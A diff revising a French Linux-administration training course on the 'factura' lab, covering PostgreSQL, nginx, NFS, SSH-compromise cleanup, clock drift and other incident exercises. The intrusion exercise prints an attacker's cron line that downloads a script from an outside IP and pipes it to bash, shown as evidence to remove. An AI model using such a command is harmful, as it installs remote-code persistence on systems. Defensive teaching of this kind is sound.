@@ -26,7 +26,7 @@ navigateur :
 curl -v --resolve factura.lab.local:443:127.0.0.1 \
   https://factura.lab.local/version 2>&1 | grep -Ei 'expire|verify|SSL'
 #  *  SSL certificate problem: certificate has expired
-#  * ... notAfter=Sep 19 01:00:00 2026 GMT
+#  *  expire date: Sep 19 01:00:00 2026 GMT
 ```
 
 On lit la fenêtre de validité et l'émetteur directement dans le certificat
@@ -134,8 +134,7 @@ mettre en place (voir PC revue). Aucune VM redémarrée. »
 
 ### PC.1.2 — max_connections PostgreSQL atteint
 
-*`FATAL: sorry, too many clients already`. Interdit : redémarrer la base hors
-de la fenêtre 12:30–13:00.*
+`FATAL: remaining connection slots are reserved for roles with the SUPERUSER attribute`*. Interdit : redémarrer la base hors de la fenêtre 12 :30–13 :00.*
 
 **Diagnostic.** On confirme, et surtout on **regarde qui est connecté** avant de
 toucher au réglage :
@@ -143,10 +142,10 @@ toucher au réglage :
 ```bash
 sudo -u postgres psql -c 'show max_connections;'
 #  max_connections | 8        <- anormalement bas
-sudo -u postgres psql -x -c \
-  "select state, count(*) from pg_stat_activity group by state;"
-#  state               | idle in transaction | 5
-#  state               | active              | 2
+sudo -u postgres psql -c "select state, count(*) from pg_stat_activity
+  where backend_type = 'client backend' group by state;"
+#  idle in transaction |     5
+#  active              |     1      <- notre propre requête
 ```
 
 Cinq sessions **`idle in transaction`** : des transactions ouvertes qui ne se
@@ -154,8 +153,8 @@ ferment jamais et gardent leur connexion. On les date et on identifie l'appli :
 
 ```bash
 sudo -u postgres psql -x -c \
-  "select pid, usename, state, xact_start, now()-xact_start as age,
-          left(query,40) as requete
+  "select pid, usename, application_name, xact_start,
+          now()-xact_start as age, left(query,40) as requete
    from pg_stat_activity
    where state='idle in transaction' order by xact_start;"
 #  age | 00:41:12   application_name | psql   <- vieux, jamais commité
@@ -178,7 +177,7 @@ grep -rniE '^\s*max_connections' /etc/postgresql/16/main/
 **Cause racine.** Deux fautes se combinent : un « tuning » posé vendredi soir
 sans ticket a **abaissé** `max_connections` à 8, et un ETL prototype ouvre des
 transactions qu'il ne ferme jamais (`BEGIN` sans `COMMIT`). À 8 places, cinq
-sessions zombies suffisent à saturer.
+sessions zombies suffisent à saturer : PostgreSQL garde `superuser_reserved_connections` (3) places pour les superutilisateurs, il n'en reste donc que 5 pour `factura` — d'où le message « remaining connection slots are reserved… » (le classique `too many clients already` n'apparaît que lorsque les 8 places sont prises).
 
 **Correctif immédiat (sans redémarrer la base).** On libère des places en
 terminant les sessions abandonnées, ce qui **ne nécessite pas de restart** :
@@ -236,7 +235,7 @@ l'ETL. Corriger les deux, pas gonfler le chiffre.
 :::
 
 **Ce qu'il fallait écrire dans le ticket :** « Saturation `max_connections`
-(=8, abaissé par un tuning non validé du 15/09) aggravée par 5 sessions *idle in
+(=8, abaissé par un tuning non validé de vendredi 18 :40) aggravée par 5 sessions *idle in
 transaction* de `etl-compta` (BEGIN sans COMMIT). Fautif arrêté, sessions
 terminées via `pg_terminate_backend` → accès rétabli 09:52 sans restart.
 `max_connections` remis à 100 (restart programmé 12:30). Garde-fou :
@@ -253,10 +252,10 @@ casser le vhost principal, avec des droits sains.*
 
 ```bash
 ls -la /srv/www/docs
-#  drwx------ 1042 1042 ... docs   <- droits/propriétaire douteux
+#  drwxr-x--- 1042 1042 ... docs   <- droits/propriétaire douteux
 ```
 
-nginx (`www-data`) ne pourra pas lire ça : `o------`, propriétaire inconnu 1042.
+nginx (`www-data`) ne pourra pas lire ça : aucun droit pour « other », propriétaire inconnu 1042.
 On vérifie que le nom se résout et que le certificat couvre le sous-domaine
 (le setup l'a inclus dans le SAN) :
 
@@ -270,7 +269,7 @@ openssl x509 -in /etc/ssl/factura/factura.lab.local.crt -noout -ext \
 **Correctif.** Droits sains, puis vhost dédié.
 
 ```bash
-sudo chown -R www-data:www-data /srv/www/docs
+sudo chown -R root:root /srv/www/docs     # nginx lit, n'écrit pas
 sudo find /srv/www/docs -type d -exec chmod 755 {} +
 sudo find /srv/www/docs -type f -exec chmod 644 {} +
 
@@ -326,15 +325,14 @@ le frontal en publiant le nouveau.
 `chmod -R 777 /srv/www/docs` « pour que nginx puisse lire » est la faute
 classique (on la traite en vrai à PC.5.3 côté inodes, et l'esprit est le même) :
 un répertoire servi par le web en 777 est modifiable par n'importe quel
-processus de la machine. La lecture par nginx demande `755`/`644` et le bon
-propriétaire, rien de plus. Autre piège : oublier le bloc port 80 → les
+processus de la machine. La lecture par nginx demande `755`/`644`, rien de plus : le propriétaire reste `root`, pas `www-data` (un frontal compromis ne doit pas pouvoir réécrire le contenu qu'il sert). Autre piège : oublier le bloc port 80 → les
 utilisateurs qui tapent `http://docs...` tombent sur une erreur au lieu d'être
 redirigés.
 :::
 
 **Ce qu'il fallait écrire dans le ticket :** « Vhost `docs.factura.lab.local`
 publié en HTTPS (certificat existant, SAN OK), redirection 80→443, droits
-remis à `www-data`/755-644 (la livraison était en `o------`, propriétaire 1042).
+remis à `root`/755-644 (la livraison était sans droit « other », propriétaire 1042).
 Vhost principal vérifié intact. Conf commitée. »
 
 ---
@@ -441,12 +439,12 @@ supprimé encore ouvert, pas des inodes) puis localiser :
 ```bash
 df -h /var ; df -i /var          # 95 % en espace, inodes OK
 sudo du -xh --max-depth=1 /var | sort -h | tail
-#  ... 3.9G /var/log/postgresql
-#  ... 2.1G /var/lib/postgresql/16/main/pg_wal
+#  ... 18G  /var/log/postgresql
+#  ... 97M  /var/lib/postgresql/16/main/pg_wal
 ```
 
-Deux gros postes : les journaux, et le WAL. Le WAL qui gonfle a presque toujours
-une cause précise — un slot de réplication inactif :
+Les journaux écrasent tout, mais le WAL mérite un regard : un WAL qui gonfle a
+presque toujours une cause précise — un slot de réplication inactif :
 
 ```bash
 sudo -u postgres psql -x -c 'select * from pg_replication_slots;'
@@ -456,7 +454,7 @@ sudo -u postgres psql -c \
   "select slot_name,
      pg_size_pretty(pg_wal_lsn_diff(pg_current_wal_lsn(), restart_lsn))
    from pg_replication_slots;"
-#  replica_reporting | 2100 MB
+#  replica_reporting | 48 MB     <- et ça ne fera que croître
 ```
 
 Et les journaux, gonflés par une trace exhaustive laissée en place :
@@ -466,6 +464,8 @@ grep -rniE 'log_statement|log_min_duration' /etc/postgresql/16/main/conf.d/
 # 30-debug.conf: log_statement = 'all'
 # 30-debug.conf: log_min_duration_statement = 0
 ls -lhS /var/log/postgresql | head
+ls /etc/logrotate.d/ | grep -i postgres || echo "aucune rotation"
+# aucune rotation   <- postgresql-common a disparu de /etc/logrotate.d
 ```
 
 **Cause racine.** Trois contributeurs : (1) `log_statement=all` +
@@ -486,9 +486,8 @@ sudo -u postgres psql -c \
   "select pg_drop_replication_slot('replica_reporting');"
 sudo -u postgres psql -c 'checkpoint;'   # accélère la libération du WAL
 
-# 3. purger les vieux journaux applicatifs
-sudo find /var/log/postgresql -name 'postgresql-16-main.log.*' \
-  -mtime +2 -delete
+# 3. purger les vieux journaux tournés (le journal courant reste)
+sudo find /var/log/postgresql -name 'postgresql-16-main.log.*' -delete
 ```
 
 Vérification :
@@ -508,11 +507,13 @@ df -h /var        # repassé sous 85 %
     compress
     missingok
     notifempty
+    copytruncate
+    su root root
 }
 ```
 
 ::: pourquoi
-Un slot de réplication garantit à PostgreSQL qu'un consommateur en retard pourra
+`copytruncate` parce que PostgreSQL (lancé par `pg_ctlcluster`) garde son journal ouvert; `su root root` parce que `/var/log/postgresql` est inscriptible par le groupe `postgres` et que logrotate refuse sinon d'y travailler. (Restaurer le `postgresql-common` d'origine, depuis le paquet, est l'autre option — mais pas les deux : deux règles sur le même fichier et logrotate s'arrête en « duplicate log entry ».) Un slot de réplication garantit à PostgreSQL qu'un consommateur en retard pourra
 rejouer le WAL : tant que le slot existe, le serveur **refuse** de recycler les
 segments WAL au-delà de `restart_lsn`, quitte à saturer le disque. C'est une
 sécurité qui se retourne contre toi si le consommateur a disparu sans qu'on
@@ -533,11 +534,10 @@ chercher **pourquoi** le WAL grossit avant de chercher de la place.
 :::
 
 **Ce qu'il fallait écrire dans le ticket :** « lab-db 95 %. Trois causes : slot
-de réplication `replica_reporting` inactif retenant 2,1 Go de WAL (réplica
-décommissionné), `log_statement=all` laissé depuis un debug, vieux journaux non
-tournés. Slot supprimé (WAL libéré au checkpoint, aucun rm manuel), debug
-retiré (`pg_reload_conf`), journaux >2 j purgés. Repassé <85 %. Prévention :
-logrotate + alerte slots inactifs. Aucun restart. »
+de réplication `replica_reporting` inactif retenant du WAL sans limite (réplica
+décommissionné), `log_statement=all` laissé depuis un debug, vieux journaux jamais purgés (règle logrotate disparue). Slot supprimé (WAL libéré au checkpoint, aucun rm manuel), debug
+retiré (`pg_reload_conf`), journaux tournés purgés. Repassé <85 %. Prévention :
+logrotate rétabli + alerte slots inactifs. Aucun restart. »
 
 ---
 
@@ -561,9 +561,9 @@ grep archives /proc/mounts
 On confirme les processus bloqués en `D` (attente ininterruptible) :
 
 ```bash
-ps -eo state,pid,wchan:24,comm | awk '$1 ~ /^D/'
-#  D 18477 nfs_wait_bit_killable export-archives
-#  D 18990 rpc_wait_bit_killable df
+ps -eo state,pid,wchan:24,args | awk '$1 ~ /^D/'
+#  D 18477 rpc_wait_bit_killable export-archives /srv/factura/data/...
+#  D 18990 rpc_wait_bit_killable df -h
 ```
 
 La charge élevée avec CPU au repos s'explique : `load average` compte les `D`.
@@ -595,17 +595,21 @@ options `nofail`, un timeout de montage, et un montage **soft** avec `timeo`/
 `retrans` bornés pour ce partage d'archives non critique.
 
 ```ini
-# /etc/fstab
-127.0.0.1:/srv/factura-nfs /mnt/archives nfs \
-  _netdev,nofail,soft,timeo=50,retrans=2,x-systemd.mount-timeout=10 0 0
+# fstab n'accepte pas de ligne continuée par « \ » : on écrit UNE ligne
+O=_netdev,nofail,soft,timeo=50,retrans=2,x-systemd.mount-timeout=10
+sudo sed -i '\|[[:space:]]/mnt/archives[[:space:]]|d' /etc/fstab
+echo "127.0.0.1:/srv/factura-nfs /mnt/archives nfs $O 0 0" \
+  | sudo tee -a /etc/fstab
+sudo systemctl daemon-reload
+sudo umount /mnt/archives && sudo mount /mnt/archives   # nouvelles options
 ```
 
 ::: pourquoi
 Un montage NFS `hard` (le défaut) garantit qu'aucune donnée n'est perdue : le
 client **réessaie indéfiniment** jusqu'à ce que le serveur réponde. Le prix, si
 le serveur disparaît, est que tout processus qui touche le point de montage part
-en `D` (attente ininterruptible) — un état qu'on ne peut même pas tuer par
-`SIGKILL`, car le processus est dans le noyau. `df` sans argument fige parce
+en `D` (attente dans le noyau) — un état qui ignore les signaux ordinaires; pour NFS l'attente est « killable » (le `_killable` du `wchan`) : seul
+`SIGKILL` passe, mais tuer les processus ne débloque pas le montage, et tout nouvel accès se refige. `df` sans argument fige parce
 qu'il parcourt **tous** les montages, y compris le NFS mort ; d'où le réflexe
 `df -x nfs` ou la lecture de `/proc/mounts`. `soft` fait abandonner après
 `timeo*retrans` : acceptable pour des archives, dangereux pour des données en
@@ -639,7 +643,7 @@ contenter de relancer.*
 
 ```bash
 ls -lh /var/backups/factura/ | tail
-tar -tzf /var/backups/factura/factura-*-0200.tar.gz | head
+tar -tzf "$(ls -1t /var/backups/factura/*.tar.gz | head -1)" | head
 # (rien) — l'archive ne contient aucun fichier
 ```
 
@@ -784,7 +788,7 @@ journalctl -u factura-purge.service -n 20 --no-pager    # traces
 Trois protections rendent une purge sûre : (1) filtrer **positivement**
 (`-name '*.csv'`) plutôt que « tout sauf » — on ne supprime que ce qu'on a
 explicitement ciblé ; (2) exclure les cas protégés (`! -name '*-legal.csv'`,
-`-not -path ".../archives-legales/*"`) ; (3) un `--dry-run` qui montre ce qui
+`-not -path ".. ./archives-legales/*"`) ; (3) un `--dry-run` qui montre ce qui
 serait supprimé avant de le faire, et une **journalisation** de chaque
 suppression (systemd la capture dans le journal). `find -print0` + `read -d ''`
 gère les espaces/retours dans les noms. `OnCalendar=Sun` cible le dimanche ;
@@ -833,13 +837,13 @@ sudo grep -E 'deploy' /var/log/auth.log | grep -Ei 'failed|accepted'
 # ... Accepted password for deploy from 198.51.100.7 ...  <- réussite
 ```
 
-Une réussite **par mot de passe** depuis une IP externe : PostgreSQL. On cherche
+Une réussite **par mot de passe** depuis une IP externe, juste après des échecs : la compromission est quasi certaine. On cherche
 ce que l'intrus a laissé :
 
 ```bash
 sudo crontab -u deploy -l
 # */5 * * * * curl -s http://198.51.100.7/x.sh | bash   <- persistance
-grep -n 'attaquant@inconnu' /home/deploy/.ssh/authorized_keys
+sudo grep -n 'attaquant@inconnu' /home/deploy/.ssh/authorized_keys
 # clé publique étrangère ajoutée                          <- porte dérobée
 ```
 
@@ -867,13 +871,17 @@ sudo crontab -u deploy -r          # supprime le cron malveillant
 # 2. verrouiller le compte et couper l'auth par mot de passe
 sudo passwd -l deploy
 sudo rm /etc/ssh/sshd_config.d/05-migration.conf
+# retirer le « yes » ne suffit pas : le défaut d'OpenSSH est « yes »
+echo 'PasswordAuthentication no' \
+  | sudo tee /etc/ssh/sshd_config.d/00-durcissement.conf
 sudo sshd -t && sudo systemctl reload ssh
+sudo sshd -T | grep -i '^passwordauthentication'    # no
 # 3. vérifier qu'on n'a pas cassé la CI (clé légitime préservée)
-grep -c 'ci-factura@lab-ops' /home/deploy/.ssh/authorized_keys   # 1
-factura-deploy && echo "CI OK"
+sudo grep -c 'ci-factura@lab-ops' /home/deploy/.ssh/authorized_keys   # 1
+sudo factura-deploy && echo "CI OK"   # clé CI lisible par root seulement
 ```
 
-**Prévention.** `PasswordAuthentication no` global (les changements temporaires
+**Prévention.** `PasswordAuthentication no` explicite et global (les changements temporaires
 se tracent et s'expirent), rotation des secrets exposés (le mot de passe DB est
 dans `api.env` sur cette VM : le considérer comme compromis et le changer),
 alerte SIEM sur « Accepted password » (qui ne devrait jamais arriver si l'auth
@@ -921,7 +929,7 @@ clés. Interdit : réactiver l'auth par mot de passe.*
 verbeux :
 
 ```bash
-factura-deploy
+sudo factura-deploy        # la clé de la CI (0700 root) exige sudo
 # deploy@127.0.0.1: Permission denied (publickey).
 sudo ssh -i /var/lib/factura-ci/id_ed25519 -v deploy@127.0.0.1 true 2>&1 \
   | grep -Ei 'offer|denied|Authenticating'
@@ -932,8 +940,9 @@ sudo ssh -i /var/lib/factura-ci/id_ed25519 -v deploy@127.0.0.1 true 2>&1 \
 La clé privée présentée est `id_ed25519`. Sa clé publique est-elle autorisée ?
 
 ```bash
-ssh-keygen -y -f /var/lib/factura-ci/id_ed25519 | cut -d' ' -f2 > /tmp/pub-ci
-grep -Ff /tmp/pub-ci /home/deploy/.ssh/authorized_keys && echo présente \
+sudo ssh-keygen -y -f /var/lib/factura-ci/id_ed25519 | cut -d' ' -f2 \
+  > /tmp/pub-ci
+sudo grep -Ff /tmp/pub-ci /home/deploy/.ssh/authorized_keys && echo présente \
   || echo ABSENTE
 # ABSENTE
 ```
@@ -957,13 +966,15 @@ Deux options ; la plus sûre est de régénérer une paire et de la mettre des d
 côtés :
 
 ```bash
-# régénérer la paire de service et l'installer côté deploy
+# 1. retirer la clé orpheline (personne n'a sa privée) AVANT d'ajouter la
+#    nouvelle, qui portera le même commentaire
+sudo sed -i '/ci-factura-2026@lab-ops/d' /home/deploy/.ssh/authorized_keys
+# 2. régénérer la paire de service et installer la publique côté deploy
 sudo ssh-keygen -t ed25519 -N '' -C 'ci-factura-2026@lab-ops' \
   -f /var/lib/factura-ci/id_ed25519 <<<y
-sudo tee -a /home/deploy/.ssh/authorized_keys < \
+sudo tee -a /home/deploy/.ssh/authorized_keys >/dev/null < \
   /var/lib/factura-ci/id_ed25519.pub
-# retirer les clés orphelines (dont personne n'a la privée), garder la bonne
-factura-deploy && echo "déploiement rétabli"
+sudo factura-deploy && echo "déploiement rétabli"
 ```
 
 **Prévention.** Une rotation de clé se fait **add-then-remove** : on ajoute la
@@ -1046,7 +1057,7 @@ résolution (ce n'est pas le cas ici).
 
 **Prévention.** Mettre `/etc/hosts` sous gestion (Ansible, git) pour qu'un
 nettoyage manuel soit détecté et rétabli, ou basculer vers un vrai DNS interne
-(le module 12 fait mieux que `/etc/hosts`) avec supervision de la résolution.
+(le module 13 monte un DNS BIND/Unbound) avec supervision de la résolution.
 
 ::: pourquoi
 `could not translate host name` est une erreur de **résolution** (`getaddrinfo`
@@ -1174,33 +1185,34 @@ contrat Comptaflux. À revoir/retirer en fin de contrat. »
 
 ### PC.4.2 — Horloge dérivée casse TLS
 
-*TLS échoue par intermittence (`certificate is not yet valid`), horodatages en
-avance ; certificats non touchés. Interdit : régénérer les certificats, reboot.*
+*TLS échoue depuis lab-web (`certificate`* `is not yet valid`*), horodatages en retard; certificats non touchés à la main. Interdit : régénérer les certificats, reboot.*
 
 **Diagnostic.** On compare l'heure de la machine à l'heure réelle et l'état de
 la synchro :
 
 ```bash
 timedatectl
-#  Local time: ... (en avance d'environ 37 min)
+#  Local time: ... (en retard d'environ 3 h)
 #  NTP service: inactive          <- synchro coupée
 #  System clock synchronized: no
 date -u                            # comparer à une source fiable (téléphone)
 ```
 
-On relie à l'erreur TLS : un certificat a `notBefore`/`notAfter` ; si l'horloge
-locale est trop en avance, un certificat valide peut paraître **expiré**, ou un
-certificat fraîchement émis paraître **pas encore valide** :
+On relie à l'erreur TLS : un certificat a `notBefore`/`notAfter` ; une horloge
+locale en **retard** voit un
+certificat fraîchement émis comme **pas encore valide** (une horloge en avance, elle, verrait expirer trop tôt un certificat proche de son échéance) :
 
 ```bash
 openssl x509 -in /etc/ssl/factura/factura.lab.local.crt -noout -dates
-# le certificat est bon ; c'est l'HORLOGE du client qui est fausse
+# notBefore=<cette nuit, heure réelle>   <- renouvellement automatique
+date -u                                  # ... 3 h AVANT ce notBefore
+# le certificat est bon ; c'est l'HORLOGE de lab-web qui est fausse
 ```
 
 **Cause racine.** La synchronisation du temps (NTP/timesyncd) a été désactivée
-et l'horloge a dérivé de plus d'une demi-heure. La validation TLS, qui compare
-l'heure courante aux bornes du certificat, échoue par intermittence selon les
-marges de tolérance des clients. Aucun certificat n'est en cause.
+et l'horloge de lab-web a pris trois heures de retard. Le renouvellement automatique de la nuit a produit un certificat parfaitement valide, mais dont le `notBefore` est encore « dans le futur » pour lab-web : tout client qui tourne sur lab-web (curl,
+l'API, les
+jobs) le refuse. Aucun certificat n'est en cause.
 
 **Correctif (sans toucher aux certificats, sans reboot).**
 
@@ -1222,11 +1234,7 @@ réseau externe.
 ::: pourquoi
 Toute la cryptographie basée sur le temps (validité des certificats, jetons,
 Kerberos, TOTP) suppose des horloges **proches**. La poignée de main TLS vérifie
-`notBefore <= maintenant <= notAfter` : une horloge locale avancée de 37 minutes
-peut faire tomber un certificat juste avant son expiration, ou rejeter un
-certificat tout neuf comme « not yet valid » côté pairs. Le symptôme
-« intermittent » vient des marges de tolérance différentes selon les clients et
-du fait que seuls les certificats proches d'une borne basculent. `timedatectl`
+`notBefore <= maintenant <= notAfter`, sans aucune tolérance côté OpenSSL : une horloge en retard de 3 h rejette tout certificat émis depuis moins de 3 h (« not yet valid »), une horloge en avance fait tomber un certificat juste avant son expiration. Seuls les clients **dont l'horloge est fausse** échouent — les postes à l'heure acceptent le même certificat — d'où un symptôme qui semble intermittent vu de l'équipe. `timedatectl`
 donne d'un coup l'heure, l'état NTP et la synchro — c'est le premier réflexe dès
 qu'on voit des horodatages incohérents.
 :::
@@ -1239,9 +1247,8 @@ piège : `date -s` à la main sans réactiver NTP — tu recales une fois, l'hor
 redérive. Toujours réactiver la synchro **et** l'activer au boot.
 :::
 
-**Ce qu'il fallait écrire dans le ticket :** « TLS `not yet valid`/`expired`
-intermittent + horodatages en avance = horloge dérivée (+37 min), synchro NTP
-désactivée. Certificats sains (non touchés). `timedatectl set-ntp true` +
+**Ce qu'il fallait écrire dans le ticket :** « TLS `not yet valid` depuis lab-web + horodatages en retard = horloge dérivée (−3 h), synchro NTP
+désactivée; le certificat renouvelé cette nuit n'était pas encore valide pour cette horloge. Certificats sains (non touchés). `timedatectl set-ntp true` +
 timesyncd activé au boot ⇒ horloge synchro, TLS 200. Prévention : supervision
 de l'offset + serveur de temps interne. Aucun reboot. »
 
@@ -1263,6 +1270,7 @@ vmstat 1 3
 On mesure Redis :
 
 ```bash
+REDIS_PASS=$(sudo awk '/^requirepass/ {print $2}' /etc/redis/redis.conf)
 redis-cli -a "$REDIS_PASS" --no-auth-warning info memory | \
   grep -E 'used_memory:|used_memory_human|maxmemory_human|maxmemory_policy'
 # used_memory_human:392.10M
@@ -1344,8 +1352,12 @@ docker ps --format '{{.Names}}\t{{.Status}}'
 docker inspect --format '{{json .State.Health}}' factura-worker | \
   python3 -m json.tool | head -20
 # "Status": "unhealthy",
-# "Log": [ { "ExitCode": -1, "Output": "" } ... ]   <- timeout, pas d'échec réel
-docker inspect -f '{{.RestartCount}}' factura-worker    # grimpe
+# "Log": [ { "ExitCode": -1,
+#            "Output": "Health check exceeded timeout (1s)" } ... ]
+#                                  <- timeout, pas un échec réel de la sonde
+docker inspect -f '{{.State.StartedAt}}' factura-worker   # il y a < 1 min
+journalctl -u factura-autoheal.service -n 5 --no-pager
+# conteneur factura-worker unhealthy : redémarrage   <- en boucle
 ```
 
 On regarde les paramètres appliqués :
@@ -1376,13 +1388,13 @@ EOF
 sudo systemctl restart factura-worker.service
 sleep 20
 docker inspect -f '{{.State.Health.Status}}' factura-worker   # healthy
-docker inspect -f '{{.RestartCount}}' factura-worker          # se stabilise
+docker inspect -f '{{.State.StartedAt}}' factura-worker  # ne bouge plus
 ```
 
 **Prévention.** Régler `timeout` **au-dessus** du temps de réponse réel de la
 sonde (avec marge), donner plusieurs `retries` pour absorber un pic isolé, et
 une `start-period` cohérente avec le temps de démarrage de l'appli. Surveiller
-`RestartCount` (une hausse continue est un signal).
+les redémarrages (journal de l'autoheal, `StartedAt` qui rajeunit; `RestartCount` ne compte que les relances de la *restart policy* Docker, ni les `docker restart` de l'autoheal ni les recréations par systemd).
 
 ::: pourquoi
 Un healthcheck Docker déclare `unhealthy` quand la sonde échoue `retries` fois
@@ -1411,8 +1423,7 @@ qu'au module 19.
 unhealthy : sonde ~1,5 s mais `health-timeout=1s`, `retries=1`, `start=1s`
 (resserrés la veille) ⇒ tous les contrôles expirent, autoheal redémarre en
 boucle. Conteneur sain. Réglé timeout=5s, retries=3, start=15s ⇒ healthy stable.
-Healthcheck conservé. Prévention : timeout > temps de sonde + surveiller
-RestartCount. »
+Healthcheck conservé. Prévention : timeout > temps de sonde + alerte sur les redémarrages de l'autoheal. »
 
 ---
 
@@ -1441,12 +1452,13 @@ ALTER DEFAULT PRIVILEGES IN SCHEMA public GRANT SELECT TO revizor_ro;
 SQL
 ```
 
-Restreindre l'accès réseau à lab-adm dans `pg_hba.conf` (avant toute règle
-large) :
+Restreindre l'accès réseau à lab-adm dans `pg_hba.conf`. `pg_hba` s'arrête à la **première** ligne qui correspond : la ligne
+large `host all all 10.10.10.0/24` posée au setup laisserait `revizor_ro` entrer depuis n'importe quelle VM du lab. Il faut donc, **avant** elle, autoriser lab-adm **et** rejeter le reste pour ce rôle :
 
 ```bash
-# /etc/postgresql/16/main/pg_hba.conf
+# /etc/postgresql/16/main/pg_hba.conf — AVANT la ligne 10.10.10.0/24
 # host  factura  revizor_ro  10.10.10.10/32  scram-sha-256
+# host  all      revizor_ro  0.0.0.0/0       reject
 sudo -u postgres psql -c 'select pg_reload_conf();'
 ```
 
@@ -1467,14 +1479,14 @@ NOCREATEROLE` — un superuser ignore tous les GRANT), les **privilèges objets*
 (`GRANT SELECT`, jamais `INSERT/UPDATE/DELETE`), la **portée dans le temps**
 (`VALID UNTIL` expire le compte automatiquement, ce qui évite l'oubli d'un accès
 temporaire), la **charge** (`CONNECTION LIMIT`), et l'**accès réseau**
-(`pg_hba.conf` restreint à `10.10.10.10/32`). `ALTER DEFAULT PRIVILEGES` couvre
+(`pg_hba.conf` : `10.10.10.10/32` autorisé, tout le reste rejeté pour ce rôle). `ALTER DEFAULT PRIVILEGES` couvre
 les tables futures, sinon l'auditeur ne verrait pas une table créée après le
 GRANT. Un `SET ROLE` permet de tester exactement ce que le rôle peut faire.
 :::
 
 ::: piege
-Donner `SELECT` sans `USAGE ON SCHEMA public` : l'auditeur ne voit rien
-(permission denied sur le schéma). Oublier `VALID UNTIL` : l'accès temporaire
+Donner `SELECT` sans `USAGE` sur un schéma applicatif dédié : l'auditeur ne voit rien
+(permission denied sur le schéma) — sur `public`, PostgreSQL 16 accorde encore `USAGE` à `PUBLIC`, mais pas sur les schémas que tu crées. Oublier `VALID UNTIL` : l'accès temporaire
 devient permanent, personne ne le révoque. Créer le rôle superuser « pour que ça
 marche » : il peut alors tout écrire, l'audit devient un risque. Et ouvrir
 `pg_hba` en `0.0.0.0/0` : la base est exposée bien au-delà de lab-adm.
@@ -1483,7 +1495,7 @@ marche » : il peut alors tout écrire, l'audit devient un risque. Et ouvrir
 **Ce qu'il fallait écrire dans le ticket :** « Rôle `revizor_ro` (audit
 Revizor) : LOGIN, NOSUPERUSER/NOCREATEDB/NOCREATEROLE, `VALID UNTIL 2026-10-03`,
 `CONNECTION LIMIT 5`, `SELECT` seul sur `factura` (+ default privileges),
-`pg_hba` restreint à 10.10.10.10/32. Lecture OK, écriture refusée (testé).
+`pg_hba` : 10.10.10.10/32 autorisé, reste rejeté pour ce rôle. Lecture OK, écriture refusée (testé).
 Compte expire seul en fin de mission. »
 
 ---
@@ -1532,15 +1544,15 @@ curl -s http://127.0.0.1/ | grep -qi welcome && echo ENCORE || echo OK
 ```
 
 **Prévention.** Placer `/etc/nginx` sous **git** (on voit et on rejoue toute
-modification), fixer la politique dpkg pour les fichiers de conf critiques, et
+modification), ne jamais éditer un conffile du paquet (vhost dans son propre fichier), fixer la politique dpkg (`Dpkg::Options { "--force-confold"; }`), et
 lancer les mises à jour avec un **smoke test** post-MAJ (probe HTTPS) plutôt
 qu'en aveugle la nuit.
 
 ::: pourquoi
 Quand un paquet met à jour un fichier marqué « conffile » et que tu l'as modifié,
-dpkg ne l'écrase pas silencieusement en principe : il propose de garder/remplacer,
-et en mode non interactif applique une politique par défaut, conservant l'écarté
-en `.dpkg-old` (ou installant le neuf en `.dpkg-dist`). Le symptôme « page par
+dpkg ne l'écrase pas silencieusement : il demande. S'il est configuré pour prendre la version du paquet (réponse « Y »,
+ou `--force-confnew` dans les options apt de la MAJ automatique), il garde la tienne
+en `.dpkg-old` ; avec `--force-confold` (le choix d'unattended-upgrades), c'est l'inverse : ta version reste en place et celle du paquet arrive en `.dpkg-dist`. dpkg ne touche d'ailleurs qu'aux conffiles **qu'il a livrés** (`dpkg-query -W -f '${Conffiles}' nginx-common`) : le scénario reproduit le cas réel d'un vhost écrit directement dans le fichier du paquet (`sites-available/default`); un fichier à toi, bien séparé, n'aurait jamais été touché. Le symptôme « page par
 défaut + plus de TLS » est la signature d'une conf applicative remplacée par
 celle du paquet. La réparation n'est jamais « réinstaller nginx » (ça ne
 ramène pas ta conf) : c'est **restaurer** le vhost depuis le `.dpkg-old`, valider
@@ -1607,7 +1619,7 @@ sudo touch /var/lib/factura-cache/.test && echo "écriture OK"
 faire tourner/expirer les fichiers de session (le processus doit nettoyer ou
 utiliser un stockage adapté aux nombreux petits objets), et, à la création d'un
 FS destiné à beaucoup de petits fichiers, prévoir assez d'inodes (`mkfs -N` /
-`-i`).
+`-i`). Une sonde minimale, à lancer par un timer : `sudo tee /usr/local/sbin/inode-check >/dev/null <<'EOF' #!/usr/bin/env bash # alerte si un système de fichiers dépasse 90 % d'inodes utilisés (df -i) df -i --output=ipcent,target -x tmpfs -x devtmpfs -x squashfs \ | awk 'NR > 1 && $1 + 0 > 90 { print "inodes", $0; e = 1 } END { exit e }' EOF sudo chmod +x /usr/local/sbin/inode-check`
 
 ::: pourquoi
 Un système de fichiers a **deux** ressources finies : les blocs (l'espace en
@@ -1617,14 +1629,12 @@ sans consommer d'espace : `df -h` reste bas, `df -i` est à 100 %, et toute
 création échoue avec `ENOSPC` (« No space left »), le même code d'erreur que
 pour un disque plein — d'où la confusion. La commande qui tranche est `df -i`.
 C'est le pendant du module 19 (« df plein, du d'accord ? fichier supprimé ?
-inodes ? ») : ici, la troisième branche. Agrandir le volume n'ajoute pas
-d'inodes à un ext4 existant ; il faudrait recréer le FS — donc ce n'est pas la
-solution.
+inodes ? ») : ici, la troisième branche. Agrandir un ext4 n'ajoute des inodes qu'en ajoutant des groupes de blocs, au même ratio octets/inode (ici, un volume de 64 Mo tient dans un seul groupe : l'agrandir un peu n'en ajoute aucun) ; et de toute façon le processus fautif remplirait les nouveaux. Changer le ratio exige de recréer le FS — ce n'est pas un geste d'astreinte.
 :::
 
 ::: piege
-Agrandir le volume « puisqu'il est plein » : ça n'ajoute pas d'inodes, la panne
-persiste. Supprimer les fichiers sans arrêter le processus qui les crée : les
+Agrandir le volume « puisqu'il est plein » : au mieux quelques inodes de plus au même ratio, vite remangés par le processus, la panne
+revient. Supprimer les fichiers sans arrêter le processus qui les crée : les
 inodes se re-remplissent en secondes. Ne surveiller que l'espace (`df -h`) et
 rater l'épuisement d'inodes jusqu'à l'incident : l'alerte doit inclure `df -i`.
 Enfin, `chmod -R 777` « pour que ça écrive enfin » (le réflexe du ticket réel) :
@@ -1649,13 +1659,14 @@ défaut après MAJ nocturne).*
 # Post-mortem — INC-5202 — Perte du HTTPS de Factura après mise à jour nocturne
 
 ## Résumé
-Le portail Factura a été inaccessible en HTTPS pendant 41 minutes le vendredi
-matin, après qu'une mise à jour automatique de paquet a remplacé la
+Le portail Factura a été inaccessible en HTTPS pendant 2 h 41 (161 minutes) le
+vendredi matin, après qu'une mise à jour automatique de paquet a remplacé la
